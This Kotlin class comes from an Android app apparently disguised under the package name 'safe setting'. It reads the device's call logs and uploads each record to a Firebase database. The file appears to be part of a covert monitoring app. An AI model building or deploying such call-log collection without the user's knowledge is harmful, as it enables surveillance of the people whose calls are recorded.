package com.safe.setting.app.services.call

import android.content.Context
import dagger.hilt.android.qualifiers.ApplicationContext
import com.safe.setting.app.data.model.Call
import com.safe.setting.app.data.rxFirebase.InterfaceFirebase
import com.safe.setting.app.services.base.BaseInteractorService
import com.safe.setting.app.utils.Consts
import javax.inject.Inject

class InteractorCall<S : InterfaceServiceCall> @Inject constructor(
    private val firebase: InterfaceFirebase,
    @ApplicationContext context: Context
) : BaseInteractorService<S>(context, firebase), InterfaceInteractorCall<S> {

    override fun getCallLogs() {
        getService()?.getCallLogs(getContext())
    }

    override fun setCallLogs(call: Call) {
        firebase.getDatabaseReference(Consts.CALLS).push().setValue(call)
    }
}